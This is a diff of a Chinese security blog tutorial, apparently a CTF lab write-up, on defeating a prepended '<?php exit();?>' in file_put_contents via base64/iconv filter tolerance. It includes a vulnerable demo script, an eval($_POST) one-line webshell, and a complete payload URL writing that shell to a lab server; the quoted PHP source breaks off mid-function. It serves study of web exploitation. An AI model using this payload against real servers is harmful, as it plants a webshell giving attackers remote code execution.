@@ -291,8 +291,18 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#demo1">Demo1</a></li>
-    <li><a href="#无效化">无效化</a></li>
+    <li><a href="#demo0">Demo0</a></li>
+    <li><a href="#无效化">无效化</a>
+      <ol>
+        <li><a href="#方法一">方法一</a></li>
+      </ol>
+    </li>
+    <li><a href="#supplement">Supplement</a>
+      <ol>
+        <li><a href="#iconv">iconv()</a></li>
+        <li><a href="#容忍性">容忍性</a></li>
+      </ol>
+    </li>
     <li><a href="#ref">Ref</a></li>
   </ol>
 </nav>
@@ -362,7 +372,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 1 分钟
+                    阅读时长: 4 分钟
                 </time>
             </div>
         
@@ -378,9 +388,9 @@
     
     
     <p>最近在复习一些内容，做记录，免得又忘了</p>
-<h1 id="demo1">Demo1</h1>
+<h1 id="demo0">Demo0</h1>
 <p>给出题目demo，如下：</p>
-<p><code>demo1.php</code></p>
+<p><code>demo0.php</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -399,15 +409,564 @@
 </span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><code>demo1.php</code>针对的是最简单的写马：</p>
+</div><p><code>demo0.php</code>针对的是最简单的写马：</p>
 <blockquote>
 <p><code>content</code>传变量名，以<code>.php</code>作为后缀</p>
 <p><code>data</code>传入一句话马</p>
 </blockquote>
-<p>但是因为<code>data</code>做了死亡拼接<code>'&lt;?php exit();?&gt;' . $data</code>，正常的所有马都不会被执行，怎么办？</p>
+<p>但是因为<code>data</code>做了死亡拼接<code>'&lt;?php exit();?&gt;' . $data</code>，正常的所有代码都不会被执行，怎么办？</p>
 <p>必须要把<code>&lt;?php exit();?&gt;</code>的执行无效化</p>
 <h1 id="无效化">无效化</h1>
-<p>网上的解法是，利用<code>file_put_contents</code>会对<code>$content</code>第一个参数中的伪协议进行处理</p>
+<p>网上的解法是，利用<code>file_put_contents</code>两个特性：</p>
+<ol>
+<li>会对<code>$content</code>第一个参数中的伪协议进行处理；</li>
+<li><code>file_put_contents</code>对伪协议的处理有一定的<a class="link" href="#%E5%AE%B9%E5%BF%8D%E6%80%A7" >容忍性</a>（或者说容错处理）；</li>
+</ol>
+<p>这里的<a class="link" href="#%E5%AE%B9%E5%BF%8D%E6%80%A7" >容忍性</a>指的是在执行转换的时候，如果被转换的目标不符合基本规则，会舍弃不符合标准的部分</p>
+<p>这种容错处理<code>base64_decode()</code>是默认开启的</p>
+<p>但是存在一些其他的转换函数，没有默认开启容错模式，却在伪协议处理的时候默认做了容错处理，例如<code>iconv()</code>，<a class="link" href="#iconv%28%29" >例子</a></p>
+<p><em><strong>利用容忍性和编码可控，将<code>&lt;?php exit();?&gt;</code>无效化</strong></em></p>
+<h2 id="方法一">方法一</h2>
+<p><strong>使用base64解码将<code>&lt;?php exit();?&gt;</code>中的非base64编码字符去掉</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php exit();?&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250110201332314.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250110201332314"
+	
+	
+></p>
+<p>利用base64解码的容错性，将<code>&lt;?php exit();?&gt;</code>中的<code>&lt;&gt;?;()</code>和空格都当做不可识别字符忽略，此时base64函数只会对<code>phpexit</code>进行解码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php exit();?&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str2</span> <span class="o">=</span> <span class="s2">&#34;phpexit&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="o">==</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$str2</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250110201826958.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250110201826958"
+	
+	
+></p>
+<p>此时可以发现，<code>&lt;?php exit();?&gt;</code>的无效化，已经达成了，此时加入我们的马</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ma</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php eval(</span><span class="se">\$</span><span class="s2">_POST[a]);&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ma</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$ma</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php exit();?&gt;&#34;</span><span class="o">.</span><span class="nv">$ma</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">--------------</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 发现报错无输出
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250110205116325.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250110205116325"
+	
+	
+></p>
+<p>稍微改改马</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ma</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php @eval(</span><span class="se">\$</span><span class="s2">_POST[a]);&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ma</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$ma</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php exit();?&gt;&#34;</span><span class="o">.</span><span class="nv">$ma</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">--------------</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 有输出，但是不是理想输出
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250110205148242.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250110205148242"
+	
+	
+></p>
+<p>这里的问题是：<strong>base64解码是需要4字节对齐的，没有被考虑</strong></p>
+<p><code>phpexit</code>被解码的时候，因为是7个字符，所以<strong>借用</strong>了一句话木马编码的第一个字符。</p>
+<p>木马编码被破坏，自然无法正确解码。解决方案很简单，在编码后的一句话马前加上一个无用字符借给<code>phpexit</code>即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ma</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php eval(</span><span class="se">\$</span><span class="s2">_POST[a]);&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ma</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$ma</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$borrow</span> <span class="o">=</span> <span class="s2">&#34;a&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php exit();?&gt;&#34;</span><span class="o">.</span><span class="nv">$borrow</span><span class="o">.</span><span class="nv">$ma</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">--------------</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250110205217747.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250110205217747"
+	
+	
+></p>
+<p>回到<code>demo0.php</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php exit();?&gt;&#39;</span> <span class="o">.</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload:<code>http://172.28.76.89:8845/demo0.php?content=tmppppp.php&amp;data=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</code></p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250110205729349.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250110205729349"
+	
+	
+></p>
+<p>下一篇拓展：无效化的其他方法</p>
+<h1 id="supplement">Supplement</h1>
+<h2 id="iconv">iconv()</h2>
+<p><a class="link" href="https://d4n-sec.github.io/p/phpfilterworks/#iconv"  target="_blank" rel="noopener"
+    >前置知识</a></p>
+<p><code>iconv1.php</code> - 函数调用时</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">iconv</span><span class="p">(</span><span class="s1">&#39;UCS-2LE&#39;</span><span class="p">,</span><span class="s1">&#39;UCS-2BE&#39;</span><span class="p">,</span><span class="s1">&#39;123456&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">iconv</span><span class="p">(</span><span class="s1">&#39;UCS-2LE&#39;</span><span class="p">,</span><span class="s1">&#39;UCS-2BE&#39;</span><span class="p">,</span><span class="s1">&#39;1234567&#39;</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250109174623651.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250109174623651"
+	
+	
+></p>
+<p><code>iconv2.php</code> - 伪协议处理时</p>
+<p>正常情况：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=test&#39;</span><span class="p">,</span><span class="s1">&#39;1234&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 删除文件 test，仅调试用
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">unlink</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File &#39;test&#39; has been deleted.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File &#39;test&#39; does not exist.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250109175219782.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250109175219782"
+	
+	
+></p>
+<p>异常情况：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=test&#39;</span><span class="p">,</span><span class="s1">&#39;1234+&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 删除文件 test 仅调试用
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">unlink</span><span class="p">(</span><span class="s1">&#39;test&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File &#39;test&#39; has been deleted.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File &#39;test&#39; does not exist.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>仅改动<code>行2</code></p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250109175324173.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250109175324173"
+	
+	
+></p>
+<p>对比发现结果相同，代表<code>+</code>被容错处理舍弃了</p>
+<h2 id="容忍性">容忍性</h2>
+<p>理解的读者可直接<a class="link" href="" >跳过</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// base64 编码解码示例
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;Hello&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$encode</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$encode</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span> <span class="c1">//SGVsbG8=
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;-------------------------</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 将字符串拆分成数组
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 在每个字符之间插入 ) 号
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$characters</span> <span class="o">=</span> <span class="nx">str_split</span><span class="p">(</span><span class="nv">$encode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$modifiedString</span> <span class="o">=</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="nv">$characters</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$modifiedString</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span> <span class="c1">// S)G)V)s)b)G)8)=
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="s2">&#34;-------------------------</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 尝试解码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$decode</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$modifiedString</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$decode</span><span class="p">;</span>  <span class="c1">// Hello
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>例如：</p>
+<ol>
+<li>
+<p>将<code>Hello</code>Base64编码后为<code>SGVsbG8=</code></p>
+</li>
+<li>
+<p>在<code>SGVsbG8=</code>中加入Base64解码不可识别字符<code>)</code>，结果为<code>S)G)V)s)b)G)8)=</code></p>
+</li>
+<li>
+<p>如果使用Linux命令解码，发现解码失败，输出如下</p>
+</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dan@DESKTOP-V2UUA6U:~$ <span class="nb">echo</span> <span class="s1">&#39;S)G)V)s)b)G)8)=&#39;</span><span class="p">|</span>base64 -d
+</span></span><span class="line"><span class="cl">base64: invalid input
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="4">
+<li>但在php中尝试解码，发现解码成功，此为容忍性</li>
+</ol>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250109170204962.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250109170204962"
+	
+	
+></p>
+<p>在有容忍性的处理过程中，<code>)</code>因为不被识别，会被舍弃，所以<code>S)G)V)s)b)G)8)=</code> 等价于 <code>SGVsbG8=</code>，解码成功</p>
+<p>此项处理在<code>base64_decode()</code>中可以被设置</p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250109170307273.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250109170307273"
+	
+	
+></p>
+<p>其中<code>$strict = false</code>严格模式默认为<code>false</code>，即默认宽松处理</p>
+<p>在<code>php 7.0.33</code>源码中的处理函数如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">PHPAPI</span> <span class="n">zend_string</span> <span class="o">*</span><span class="nf">php_base64_decode_ex</span><span class="p">(</span><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="n">zend_bool</span> <span class="n">strict</span><span class="p">)</span> <span class="cm">/* </span><span class="p">{{{</span> <span class="err">*/</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">current</span> <span class="o">=</span> <span class="n">str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">ch</span><span class="p">,</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">padding</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">zend_string</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">result</span> <span class="o">=</span> <span class="nf">zend_string_alloc</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="cm">/* run through the whole string, converting as we go */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="n">length</span><span class="o">--</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">ch</span> <span class="o">=</span> <span class="o">*</span><span class="n">current</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="cm">/* stop on null byte in non-strict mode (FIXME: is this really desired?) */</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">strict</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
